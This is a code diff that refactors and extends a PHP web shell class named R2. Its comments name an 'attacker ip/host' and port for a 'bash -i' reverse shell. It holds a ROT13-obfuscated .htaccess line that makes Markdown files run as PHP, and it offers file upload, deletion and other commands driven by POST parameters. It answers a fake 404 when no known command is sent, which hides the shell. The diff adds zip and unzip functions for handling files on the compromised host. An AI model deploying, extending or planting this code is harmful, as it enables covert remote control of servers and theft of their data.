@@ -17,12 +17,12 @@
 
 class R2
 {
-    public static $chunk_size = 1400;
-    public static $write_a = null;
-    public static $error_a = null;
-    public static $daemon = 0;
-    public static $shell = 'bash -i'; // bash
-    public static $htaccess = 'NqqGlcr+nccyvpngvba%2Sk-uggcq-cuc+.zq';
+    protected static $chunk_size = 1400;
+    protected static $write_a = null;
+    protected static $error_a = null;
+    protected static $daemon = 0;
+    protected static $shell = 'bash -i'; // bash
+    protected static $htaccess = 'NqqGlcr+nccyvpngvba%2Sk-uggcq-cuc+.zq';
     /*
      * @param string $host attacker ip/host
      * @param int $port attacker port
@@ -127,7 +127,10 @@ class R2
      */
     public function upLoad(array $file)
     {
-        return move_uploaded_file($file['tmp_name'], $this->cwd . $file['name']);
+        return move_uploaded_file(
+            $file['tmp_name'],
+            $this->cwd . $file['name']
+        );
     }
     /*
      * @param none
@@ -283,10 +286,47 @@ class R2
             $this->cft = filemtime($file);
         }
     }
+    public function zip(string $filename, $file)
+    {
+        $zip = new ZipArchive();
+        if (substr($filename, -1) == DIRECTORY_SEPARATOR) {
+            $zip->open($this->cwd . $filename, ZipArchive::CREATE);
+            foreach ((array)$file as $files) {
+                $zip->addFile($this->cwd . $files, basename($files));
+            }
+        } else {
+            $zip->open(
+                $this->cwd . DIRECTORY_SEPARATOR . $filename,
+                ZipArchive::CREATE
+            );
+            foreach ((array)$file as $files) {
+                $zip->addFile(
+                    $this->cwd . DIRECTORY_SEPARATOR . $files,
+                    basename($files)
+                );
+            }
+        }
+
+        $zip->close();
+    }
+    public function unzip($filename, $to)
+    {
+        $zip = new ZipArchive();
+        if (substr($filename, -1) == DIRECTORY_SEPARATOR) {
+            $zip->open($this->cwd . $filename);
+            $zip->extractTo($this->cwd . $to);
+        } else {
+            $zip->open($this->cwd . DIRECTORY_SEPARATOR . $filename);
+            $zip->extractTo($this->cwd . DIRECTORY_SEPARATOR . $to);
+        }
+        $zip->close();
+    }
 }
 $r2 = new R2(true, 0);
 
-if (isset($_POST['debug'])) {
+if (isset($_POST['debug'])
+    && isset($_POST['property'])
+    && isset($_POST['value'])) {
     echo $r2->debug($_POST['debug'], $_POST['property'], $_POST['value']);
 }
 if (isset($_POST['cd'])) {
@@ -314,6 +354,10 @@ if (isset($_POST['host']) && isset($_POST['port'])) {
     echo $r2->rm($_POST['rm']);
 } elseif (isset($_POST['serial'])) {
     echo $r2->serial($_POST['serial']);
+} elseif (isset($_POST['zip']) && isset($_POST['file'])) {
+    $r2->zip($_POST['zip'], $_POST['file']);
+} elseif (isset($_POST['unzip']) && isset($_POST['to'])) {
+    $r2->unzip($_POST['unzip'], $_POST['to']);
 } else {
     header('HTTP/1.0 404 Not Found', true, 404);
     exit(404);
